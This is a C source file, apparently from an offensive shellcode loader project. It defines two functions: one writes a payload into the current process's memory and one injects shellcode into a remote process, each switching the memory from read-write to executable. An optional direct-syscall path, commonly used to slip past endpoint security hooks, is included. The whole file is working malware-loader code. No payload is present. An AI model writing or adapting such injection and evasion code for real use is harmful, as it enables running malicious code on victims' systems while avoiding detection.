#include "loaders.h"

BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
    DWORD dwOldProtection = 0;

#ifdef SYSCALL_ENABLED
	NTSTATUS STATUS = STATUS_SUCCESS;

	if ((STATUS = NtAllocateVirtualMemory(GetCurrentProcess(), pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0) {
		DebugPrint("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_memcpy(*pAddress, pPayload, sPayloadSize);
	DebugPrint("[+] Payload written to memory at: 0x%p (%d bytes)\n", *pAddress, sPayloadSize);

	if ((STATUS = NtProtectVirtualMemory(GetCurrentProcess(), pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
		DebugPrint("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		VirtualFree(*pAddress, 0, MEM_RELEASE);
		return FALSE;
	}
	DebugPrint("[+] Memory protection changed to executable\n");
#else
    // Allocate memory for the payload
    *pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*pAddress == NULL) {
        DebugPrint("[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Copy the payload to the allocated memory
    _memcpy(*pAddress, pPayload, sPayloadSize);
    DebugPrint("[+] Payload written to memory at: 0x%p (%d bytes)\n", *pAddress, sPayloadSize);

    // Change memory protection to executable
    if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        DebugPrint("[!] VirtualProtect Failed With Error: %d \n", GetLastError());
        VirtualFree(*pAddress, 0, MEM_RELEASE);
        return FALSE;
    }
	DebugPrint("[+] Memory protection changed to executable\n");
#endif

    return TRUE;
}

BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pAddress) {
	SIZE_T	sNumberOfBytesWritten = 0;
	DWORD	dwOldProtection = 0;

#ifdef SYSCALL_ENABLED
	NTSTATUS STATUS = STATUS_SUCCESS;

	if ((STATUS = NtAllocateVirtualMemory(hProcess, pAddress, 0, &sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0) {
		DebugPrint("\t[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	DebugPrint("\t[i] Allocated Memory At : 0x%p \n", pAddress);

	if ((STATUS = NtWriteVirtualMemory(hProcess, *pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0) {
		DebugPrint("\t[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	DebugPrint("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	if ((STATUS = NtProtectVirtualMemory(hProcess, pAddress, &sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
		DebugPrint("\t[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	DebugPrint("\t[i] Memory Protection Changed To Executable\n");
#else
	*pAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*pAddress == NULL) {
		DebugPrint("\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("\t[i] Allocated Memory At : 0x%p \n", *pAddress);

	if (!WriteProcessMemory(hProcess, *pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		DebugPrint("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *pAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DebugPrint("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	DebugPrint("\t[i] Memory Protection Changed To Executable\n");
#endif

	return TRUE;
}
